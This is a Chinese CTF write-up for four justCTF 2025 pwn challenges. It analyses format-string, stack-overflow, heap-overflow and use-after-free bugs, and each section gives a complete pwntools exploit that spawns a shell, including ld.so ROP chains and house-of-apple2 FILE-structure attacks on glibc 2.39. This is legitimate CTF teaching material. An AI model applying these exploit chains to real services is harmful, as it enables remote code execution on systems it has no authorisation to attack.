# justCTF2025-Pwn部分WP-先知社区

> **来源**: https://xz.aliyun.com/news/18594  
> **文章ID**: 18594

---

附件下载：<https://z-l-s-f.lanzouq.com/iZQWK32uvh7g>

### shellcode\_printer

check:

```
[*] '/home/zlsf/start/mypwn/just2025_01-20250806/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

ida:

```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
    _BYTE *addr; // [rsp+8h] [rbp-38h]
    size_t len; // [rsp+10h] [rbp-30h]
    FILE *stream; // [rsp+18h] [rbp-28h]
    char s[8]; // [rsp+20h] [rbp-20h] BYREF
    __int64 v8; // [rsp+28h] [rbp-18h]
    unsigned __int64 v9; // [rsp+38h] [rbp-8h]

    v9 = __readfsqword(0x28u);
    len = getpagesize();
    addr = mmap(0LL, len, 7, 34, -1, 0LL);
    if ( addr == (_BYTE *)-1LL )
    {
        perror("mmap");
        LABEL_12:
        munmap(addr, len);
        return 1LL;
    }
    stream = fopen("/dev/null", "w");
    if ( !stream )
    {
        perror("fopen");
        LABEL_11:
        fclose(stream);
        goto LABEL_12;
    }
    *addr = -61;
    for ( addr -= 2; ; addr += 2 )
    {
        *(_QWORD *)s = 0LL;
        v8 = 0LL;
        printf("Enter a format string: ");
        if ( !fgets(s, 16, stdin) )
        {
            perror("fgets");
            goto LABEL_11;
        }
        s[strcspn(s, "
")] = 0;
        if ( !s[0] )
            break;
        fprintf(stream, s);
    }
    return ((__int64 (*)(void))addr)();
}
```

通过ida分析我们不难发现程序先是mmap一块可读可写可执行的区域给到addr，最后程序会执行addr中的shellcode。程序通过stream打开了一个“黑洞文件”，并且进入循环将我们的输入利用fprinf写入这个文件，而漏洞点在于fprintf和printf一样具有字符串格式化漏洞，在addr每次循环后会自加2的情况下我们可以通过字格的%c和%hn一次性向addr区域写入2字节的shellcode，我们可以在addr区域写一个read调用后再写入完整的shellcode。

由于每次写入后addr都会自增2，所以返回时执行的是我们最后写入的那两个字节的shellocde，我们可以使用jmp loop（\xee\xfe）的短跳来实现rip回到addr的起始地址完成read的调用。

当程序执行到read的shellcode时我们的rsi正好设置的是syscall的下一个地址此时可以完成shellcode的续写。

由于存在爆破该脚本位八分一的概率。

exp：

```
from pwn import *
#from ctypes import *

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)
def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(read_addr)
    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(write_addr)
    return orw
def getorw(name,buf,Arch) :
    sh=shellcraft.open(name)
    sh+=shellcraft.read(3,buf,0x30)
    sh+=shellcraft.write(1,buf,0x30)
    sh=asm(sh,arch=Arch)
    return sh
def gdbp(p,a='') :
    if a!='':
        gdb.attach(p,a)
        pause()
    else :
        gdb.attach(p)
        pause()

#p = remote("shellcode-printer.nc.jctf.pro", 1337)
p = process("./pwn")
#elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#lib = cdll.LoadLibrary(None)

#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
#p = process(["qemu-mipsel-static","-L","./","./pwn"])

#context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
#elf.arch , elf.so

#loadsym = "loadsym ./libc.so.6.debug ./ld.debug /home/zlsf/LS/glibc-2.23
"

payload = b"%12616c%6$hn"
gdbp(p,"b *$rebase(0x13B2)")
sela(b": ",payload)
payload = b"%18687c%6$hn"
sela(b": ",payload)
payload = b"%54921c%6$hn"
sela(b": ",payload)
payload = b"%35148c%6$hn"
sela(b": ",payload)
payload = b"%37082c%6$hn"
sela(b": ",payload)
payload = b"%1295c%6$hn"
sela(b": ",payload)
payload = b"%62187c%6$hn"
sela(b": ",payload)
sela(b": ",b"\x00")

sleep(0.1)
payload = asm(shellcraft.sh())
se(payload)

op()
```

### prospector

libc版本：Ubuntu GLIBC 2.41-6ubuntu1.1

check:

```
[!] Did not find any GOT entries
[*] '/home/zlsf/start/mypwn/just2025_02-20250806/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

ida:

```
__int64 __fastcall sub_10FD(__int64 a1, _QWORD *a2)
{
    __int64 v3[5]; // [rsp+10h] [rbp-30h] BYREF
    __int64 v4; // [rsp+38h] [rbp-8h]

    memset(v3, 0, 32);
    v4 = sub_15CC(a1, 224LL);
    sub_1786(v4, 0LL, 224LL);
    while ( 1 )
    {
        while ( 1 )
        {
            print("Nick: ");
            if ( (int)read_FUN(0LL, v3, 223LL) > 0 )
                break;
            print("Invalid name, try again
");
        }
        sub_1075(a1, a2);
        print("Color: ");
        if ( (int)read_FUN(0LL, v4, 223LL) > 0 )
            break;
        print("Invalid color, try again
");
        if ( *(_DWORD *)(a1 + 8) == 1 )
            sub_1000(a2);
    }
    sub_1722(v3);
    sub_1722(v4);
    *a2 = sub_1668(a1, v3);
    a2[1] = v4;
    return print("Battle begins!
");
}
```

```
.text:0000000000001462 ; __unwind {
.text:0000000000001462                 endbr64
.text:0000000000001466                 push    rbp
.text:0000000000001467                 mov     rbp, rsp
.text:000000000000146A                 mov     [rbp+var_18], rdi
.text:000000000000146E                 mov     [rbp+var_20], rsi
.text:0000000000001472                 mov     [rbp+var_28], rdx
.text:0000000000001476                 mov     [rbp+var_30], rcx
.text:000000000000147A                 mov     [rbp+var_38], r8
.text:000000000000147E                 mov     [rbp+var_40], r9
.text:0000000000001482                 mov     rax, [rbp+var_18]
.text:0000000000001486                 mov     rdi, [rbp+var_20]
.text:000000000000148A                 mov     rsi, [rbp+var_28]
.text:000000000000148E                 mov     rdx, [rbp+var_30]
.text:0000000000001492                 mov     r10, [rbp+var_38]
.text:0000000000001496                 mov     r8, [rbp+var_40]
.text:000000000000149A                 mov     r9, [rbp+arg_0]
.text:000000000000149E                 syscall                 ; LINUX -
.text:00000000000014A0                 mov     [rbp+var_8], rax
.text:00000000000014A4                 mov     rax, [rbp+var_8]
.text:00000000000014A8                 pop     rbp
.text:00000000000014A9                 retn
.text:00000000000014A9 ; } // starts at 1462
```

其中sub\_10FD的参数a1,a2都是mmap申请来的可读可写的地址。

整个程序没有一点技巧可言，纯粹的调试。在sub\_10FD中我们发现存在223大小的栈溢出此时我们可以覆盖v4即可控制第二次输入失败以构造无限循环以及任意地址写。

```
__int64 __fastcall sub_1000(__int64 a1)
{
    __int64 v2[4]; // [rsp+10h] [rbp-20h] BYREF

    memset(v2, 0, sizeof(v2));
    sub_17CB(*(unsigned int *)(a1 + 16), v2);
    print("score: ");
    print(v2);
    return print("
");
}
```

其中sub\_1075中的函数sub\_1000可以为我们泄漏前面mmap申请的地址的内容，经过调试后我们发现泄漏的地址为mmap所申请的地址前四个字节相加然后去掉最高一个字节。

```
0x630466af208d    shr    rax, 0x10
0x630466af2091    add    eax, eax                        EAX => 0xe794ee34 (0x73ca771a + 0x73ca771a)
0x630466af2093    and    eax, 0x1ffffffe                 EAX => 0x794ee34 (0xe794ee34 & 0x1ffffffe)
0x630466af2098    mov    edx, eax                        EDX => 0x794ee34
0x630466af209a    mov    rax, qword ptr [rbp - 0x20]     RAX, [0x7ffc12907060] => 0x73ca771ad020 ◂— 0
► 0x630466af209e    mov    dword ptr [rax + 0x10], edx     [0x73ca771ad030] <= 0x794ee34
0x630466af20a1    mov    rax, qword ptr [rbp - 0x20]     RAX, [0x7ffc12907060] => 0x73ca771ad020 ◂— 0
0x630466af20a5    mov    rax, qword ptr [rax]            RAX, [0x73ca771ad020] => 0
0x630466af20a8    mov    qword ptr [rbp - 8], rax        [0x7ffc12907078] <= 0
0x630466af20ac    jmp    0x630466af20c8              <0x630466af20c8>
```

如图此时泄漏出来的地址为0x794ee34，我们接收该地址如何将最高字节的0xe还原最后整体整除2即可得到mmap所申请的地址的前4个字节，而通过gdb得知该地址最后三位为0，由此我们只需要爆破1字节即可获得完整的mmap所申请到的地址，并且该地址与ld-linux-x86-64.so.2的偏移是固定的，所以我们现在可以利用ld-linux-x86-64.so.2中的ROP来完成程序流劫持。

由于泄漏地址会在栈造成破坏表现为需要覆盖返回地址后面的一个固定位置为1，所以我们不能通过原先的返回地址返回，但是由于函数的多层调用，所以我们可以通过栈更后面的返回地址劫持1字节返回到syscall的附近位置（此时需要ld-linux-x86-64.so.2中的ret语句），并且我们可以控制rbp为mmap申请的地址，利用第二次read的能力向mmap中写入数据即可控制所有需要的寄存器完成getshell。

exp：

```
from pwn import *
#from ctypes import *

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)
def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(read_addr)
    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(write_addr)
    return orw
def getorw(name,buf,Arch) :
    sh=shellcraft.open(name)
    sh+=shellcraft.read(3,buf,0x30)
    sh+=shellcraft.write(1,buf,0x30)
    sh=asm(sh,arch=Arch)
    return sh
def gdbp(p,a='') :
    if a!='':
        gdb.attach(p,a)
        pause()
    else :
        gdb.attach(p)
        pause()

#p = remote("prospector.nc.jctf.pro", 1337)
#p = process("./pwn")
p = gdb.debug("./pwn","b *$rebase(0x11AB)")
#elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#lib = cdll.LoadLibrary(None)

#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
#p = process(["qemu-mipsel-static","-L","./","./pwn"])

#context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
#elf.arch , elf.so

#loadsym = "loadsym ./libc.so.6.debug ./ld.debug /home/zlsf/LS/glibc-2.23
"

payload = b"Z"*0x48 + p32(1)
#gdbp(p,"b *0x5555555551AB")
sea(b": ",payload)
reu(b": ")
buf_addr = (((int(re(9),10) + 0xE0000000) // 2) << (8*2)) + 0xC000
ph(buf_addr,"buf_addr")

base = buf_addr + 0x9000
pop_rax = base + 0x15abb
ret = pop_rax + 1
ph(ret,"ret")

payload = b"Z"*0x28 + p64(buf_addr) + p64(buf_addr+0x88) + p64(pop_rax) + p64(buf_addr) + p64(ret)*8 + b"\x82"
sea(b": ",payload)

payload = b"A"*0x40 + b"/bin/sh\x00" + p64(0)*4 + p64(buf_addr+0x40) + p64(0x3B)
sea(b": ",payload)

op()
```

### jctfcoin

libc版本：Ubuntu GLIBC 2.39-0ubuntu8.5

check:

```
[*] '/home/zlsf/start/mypwn/just2025_03-20250806/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

ida:

```
int sub_1753()
{
    unsigned int v1; // [rsp+0h] [rbp-10h] BYREF
    int v2; // [rsp+4h] [rbp-Ch]
    __int64 v3; // [rsp+8h] [rbp-8h]

    printf("Enter user index: ");
    __isoc99_scanf("%u", &v1);
    if ( v1 > 0xF || !qword_4040[v1] )
        return puts("Invalid index or user does not exist.");
    v3 = qword_4040[v1];
    do
        v2 = getchar();
    while ( v2 != 10 && v2 != -1 );
    printf("Enter new name: ");
    return sub_12EE(v3 + 16, *(_QWORD *)(v3 + 8) + 0x10LL);
}
```

该题为堆题，sub\_1753存在堆溢出可以覆盖下一个chunk的size字段造成堆块吞并。

这个题似乎加载了额外一个自定义的libc并在题目中使用过里面的函数，不过有点意义不明，我们不使用这些功能同样也能成功打通这道题。

该程序的add函数会额外给你加0x20堆块的大小，如果你申请的是0x20（0x31组）的堆块的话size位会变成0x51，利用这个机制我们可以申请个大块中间夹2个小块这样的形式，然后修改第1个大块将这4个堆块全部扔到unsortbin中，此时我们再申请第1个堆块大大小的堆块这样我们就能在第1个小块中show出libc地址，然后再一次性把2个小块作为一个堆块申请出来我们就能控制第二个小块的fd地址，此时我们能泄漏出heap基地址也同时能使用tcachebin attack劫持\_\_IO\_list\_all为堆上的地址，最后攻击house of apple2即可getshell。

实测远程和本地的heap堆地址在计算偏移的时候会相差0x30，误差的位置在脚本上已标出为 #0x30。

exp：

```
from pwn import *
import subprocess
import os
#from ctypes import *

def stre(a) : return str(a).encode()
def ph(a,b="addr") : print(b+": "+hex(a))
def re(a) : return p.recv(a)
def pre(a) : print(p.recv(a))
def reu(a,b=False) : return p.recvuntil(a,drop=b)
def rel() : return p.recvline()
def se(a) : p.send(a)
def sea(a,b) : p.sendafter(a,b)
def sel(a) : p.sendline(a)
def sela(a,b) : p.sendlineafter(a,b)
def op() : p.interactive()
def cp() : p.close()
def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
def raddr32() : return u32(p.recv(4))
def raddr_T() : return int(re(14),16)
def raddr_A() : return int(reu(b"-",True),16)
def get_pid(process_name):
    ps_output = subprocess.check_output(['ps', '-a']).decode('utf-8')
    lines = ps_output.splitlines()
    for line in lines:
        if process_name in line:
            pid = line.split()[0]
            if pid.isdigit():
                return pid
    return None
def gdbremote(pid , name = 'three' , port = '10000' , ip = '127.0.0.1'):
    os.system("gnome-terminal -- bash -c "docker exec -it " + name + " gdbserver :" + port + " --attach " + pid + " "")
    os.system("gnome-terminal -- bash -c "gdb -ex \"target remote " + ip + ":" + port + "\" "")
def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(read_addr)
    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
    orw+= p64(write_addr)
    return orw
def getorw(name,buf,Arch) :
    sh=shellcraft.open(name)
    sh+=shellcraft.read(3,buf,0x30)
    sh+=shellcraft.write(1,buf,0x30)
    sh=asm(sh,arch=Arch)
    return sh
def gdbp(p,a='') :
    if a!='':
        gdb.attach(p,a)
        pause()
    else :
        gdb.attach(p)
        pause()

#p = remote("jctfcoin.nc.jctf.pro", 1337)
#p = remote("127.0.0.1",9999)
p = process("./pwn")
#elf = ELF("./pwn")
libc = ELF("./libc.so.6")
#lib = cdll.LoadLibrary(None)

#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
#p = process(["qemu-mipsel-static","-L","./","./pwn"])

#context.log_level = 'debug'
#context.arch = 'amd64'
#context.os = 'linux'
#elf.arch , elf.so

def add(index,size,content):
    sela(b": ",stre(1))
    sela(b": ",stre(index))
    sela(b": ",stre(size))
    sela(b": ",content)

def show(index):
    sela(b": ",stre(2))
    sela(b": ",stre(index))

def edit(index,content):
    sela(b": ",stre(3))
    sela(b": ",stre(index))
    sela(b": ",content)

def dele(index):
    sela(b": ",stre(4))
    sela(b": ",stre(index))

#gdbremote(get_pid("pwn"))

add(0,0x20,b"A"*0x8)
add(1,0x190,b"B"*0x8)
add(14,0x20,b"Z"*0x8)
add(15,0x20,b"Z"*0x8)
add(2,0x1D0,b"C"*0x8)
add(3,0x20,b"D"*0x8)
edit(0,b"A"*0x28+p64(0x421))

dele(1)
add(1,0x190,b"B"*0x8)

show(14)
reu(b": ")
libc_base = int(re(15),10) - 0x203b20
ph(libc_base,"libc_base")
IO_list_all = libc_base + libc.sym["_IO_list_all"]
io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
sys_addr = libc_base + libc.sym['system']

add(4,0x60,b"A"*0x8)
dele(4)

show(14)
reu(b": ")
key = int(re(12),10)
heap_base = (key << (8+4)) - 0x1000
ph(heap_base,"heap_base")

add(5,0x20,b"A")

dele(5)
dele(15)

edit(14,b"A"*0x28 + p64(0x41) + p64((IO_list_all-0x10)^key))
add(5,0x20,b"A"*0x8)
add(6,0x20,p64(heap_base + 0x1710 + 0x30 )) #0x30

payload1 = p32(0xfffff7f5) + b";sh\x00" + p64(0x0)
fake_io_file = p64(0)*2                     
fake_io_file+= p64(0) + p64(1) 
fake_io_file+= b"\x00"*0x70 + p64(heap_base + 0x1800 + 0x30) #0x30
fake_io_file+= b"\x00"*0x30 + p64(io_wfile_jumps) 
fake_io_file+= b"\x00"*(0x10+0xE0) + p64(heap_base + 0x1918 + 0x30) #0x30
payload1+= fake_io_file

print(hex(len(payload1)))

fake_io_file = b"\x00"*0x50 + p64(sys_addr)

payload2 = fake_io_file
print(hex(len(payload2)))

add(7,0x200,payload1)
add(8,0x200,payload2)

sela(b": ",stre(6))

op()
```

### babyheap

libc版本：Ubuntu GLIBC 2.39-0ubuntu8.5

check:

```
[*] '/home/zlsf/tmp/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

ida:

```
void delete_chunk()
{
    int index; // [rsp+Ch] [rbp-4h]

    index = get_index();
    if ( *((_QWORD *)&chunks + index) )
        free(*((void **)&chunks + index));
    else
        puts("This chunk is empty");
}
```

delete\_chunk中存在uaf漏洞，程序只能申请和使用0x30大小的堆块，这道题比赛期间是我的队友完成的，所以我在此只描述一下我自己的思路。

我可能会泄漏堆地址和key后去打heap头的位置或者攻击其他chunk的size位释放来获得libc地址，拿到libc地址和heap基地址就没什么好说的了，劫持\_\_IO\_list\_all后再堆上拼一个house of apple2即可完成getshell。

这里放我队友的exp：

```
from pwn import *
#from struct import *
#from LibcSearcher import *
#from ctypes import CDLL
#from functools import reduce
#from z3 import *
#import gmpy2
#import base64
#import binascii
import time
#import os

current_dir = os.getcwd()
arch = os.uname().machine

local = 0
if local:
    p = process('./pwn')
    if local == 7:
        command = ["setarch", arch, "-R", "./pwn"]
        p = process(command)
else:
   
    p = remote('baby-heap.nc.jctf.pro', 1337, timeout=300)
    p.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

elf = ELF('./pwn')


space = 1
for item in os.listdir(current_dir):
    if item == 'libc.so.6' or space == 0:
        libc = ELF('./libc.so.6')
        success("成功加载LIBC文件...")
time.sleep(0.2)  

if elf.arch == 'amd64':
    context(arch='amd64', log_level='debug', os='linux')
if elf.arch == 'i386':
    context(arch='i386', log_level='debug', os='linux')


def ELF(func_name):
    globals()[f"{func_name}_got"] = elf.got[func_name]
    globals()[f"{func_name}_plt"] = elf.plt[func_name]

def GDB(script=""):
    gdb.attach(p, gdbscript=script)

def fmt64():
    p.recvuntil("0x")
    return int(p.recv(12), 16)

def fmt32():
    p.recvuntil("0x")
    return int(p.recv(8), 16)

def ph(var):
    var_name = [name for name, value in globals().items() if value is var][0]
    log.info(f"{var_name}  >> {hex(var)}")

def phlen(var):
    var_name = [name for name, value in globals().items() if value is var][0]
    log.info(f"{var_name}(DEC)  >> {len(var)}")
    log.info(f"{var_name}(HEX)  >> {hex(len(var))}")

def ELFlibc(real_addr, func_name):
    global libc_base, system, binsh
    libc_base = real_addr - libc.symbols[func_name]
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    success(f"libc_base  >> {hex(libc_base)}")

def Libcer(real_addr, func_name):
    global libc_base, system, binsh
    libc = LibcSearcher(func_name, real_addr)
    libc_base = real_addr - libc.dump(func_name)
    system = libc_base + libc.dump('system')
    binsh = libc_base + libc.dump('str_bin_sh')
    success(f"libc_base  >> {hex(libc_base)}")


def add(index, content):
    sla(b"> ", b"1") 
    time.sleep(0.1)   
    sla(b"Index? ", str(index).encode())  
    time.sleep(0.1)
    sa(b"Content? ", content)  
    time.sleep(0.1)

def show(index):
    sla(b"> ", b"2")
    time.sleep(0.1)
    sla(b"Index? ", str(index).encode())
    time.sleep(0.1)

def edit(index, content):
    sla(b"> ", b"3")
    time.sleep(0.1)
    sla(b"Index? ", str(index).encode())
    time.sleep(0.1)
    sa(b"Content? ", content)
    time.sleep(0.1)

def free(index):
    sla(b"> ", b"4")
    time.sleep(0.1)
    sla(b"Index? ", str(index).encode())
    time.sleep(0.1)

def exit():
    sla(b"> ", b"0")
    time.sleep(0.1)


sd = lambda data: p.send(data)
sa = lambda text, data: p.sendafter(text, data)  
sl = lambda data: p.sendline(data)
sla = lambda text, data: p.sendlineafter(text, data)  
rc = lambda num=4096: p.recv(num)
ru = lambda a, b=False: p.recvuntil(a, drop=b)
rl = lambda: p.recvline()
pr = lambda num=4096: print(p.recv(num))
l32 = lambda: u32(p.recvuntil(b'\xf7')[-4:].ljust(4, b'\x00'))
l64 = lambda: u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu32 = lambda: u32(p.recv(4).ljust(4, b'\x00'))
uu64 = lambda: u64(p.recv(6).ljust(8, b'\x00'))
int16 = lambda data: int(data, 16)


add(0, b'a'*8)
add(1, b'a'*8)
free(0)
show(0)
time.sleep(0.3)  

key = uu64()
ph(key)
heap_base = key << 12
ph(heap_base)
add(2, b'a'*8)
time.sleep(0.2)

add(3, b'a'*8)
time.sleep(0.2)

add(4, b'a'*8)
free(1)
time.sleep(0.2)

free(0)
edit(0, p64(key ^ (heap_base + 0x2d0)))
time.sleep(0.2)

add(5, b'a'*8)
add(6, b'b'*8 + p64(0x41 + 0x40 + 0x40))
time.sleep(0.2)

add(7, b'a'*8)
add(8, b'a'*8)
add(9, b'a'*8)
free(8)
time.sleep(0.2)

free(7)
time.sleep(0.5)  

edit(7, p64((heap_base + 0xa0 - 0x20) ^ key))
time.sleep(0.2)

add(10, b'a'*8)
add(11, (b'\x00' + b'\x00')*24)
time.sleep(0.2)

edit(11, (b'\x00' + b'\x00'))
time.sleep(0.2)

free(8)
time.sleep(0.2)

free(7)
time.sleep(0.2)

edit(7, p64((heap_base + 0x10) ^ key))
time.sleep(0.2)

add(12, b'a'*8)
add(13, (b'\x07' + b'\x00')*24)
time.sleep(0.2)

free(1)
show(1)
libc_base = l64() - 0x203b20  
ph(libc_base)
IO_list_all = libc_base + libc.sym['_IO_list_all']
ph(IO_list_all)
time.sleep(1)  

edit(11, (b'\x00' + b'\x00')*24)
time.sleep(0.3)

edit(13, (b'\x00' + b'\x00')*24)
time.sleep(0.3)

add(14, b'a'*8)
add(15, b'a'*8)
add(16, b'a'*8)
time.sleep(0.2)

edit(13, (b'\x00' + b'\x00')*2 + (b'\x01' + b'\x00'))
time.sleep(0.2)

free(0)
edit(0, p64(IO_list_all ^ key))
add(17, b'a'*8)
add(18, p64(heap_base + 0x2e0))
time.sleep(0.3)

IO_addr = heap_base + 0x2d0
IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
system = libc_base + libc.sym['system']
time.sleep(0.2)


IO = flat(
    {
        0: p32(0xfffff7f5) + b';sh\x00',
        0x8: p64(0x420),
        0x28: 1,
        0xa0: IO_addr + 0xd8 - 0xb0,
        0xd8: IO_wfile_jumps,
        0xe0: IO_addr,
    },
    filler=b'\x00'
)
edit(14, IO[0x0:0x30])
time.sleep(0.2)
edit(15, IO[0x40:0x70])
time.sleep(0.2)
edit(16, IO[0x80:0xb0])
time.sleep(0.2)
edit(7, IO[0xc0:0xf0])
time.sleep(0.2)

free(9)
edit(11, b'\x00'*8*4 + p64(heap_base + 0x3d0))
time.sleep(0.3)

add(19, b'\00'*8)
ph(IO_addr)
time.sleep(0.2)

ph(system)
time.sleep(0.2)

edit(19, b'\00'*8 + p64(heap_base + 0x2a0 - 0x68)*4)
time.sleep(0.2)

edit(0, p64(system)*6)
exit()
p.interactive()
```
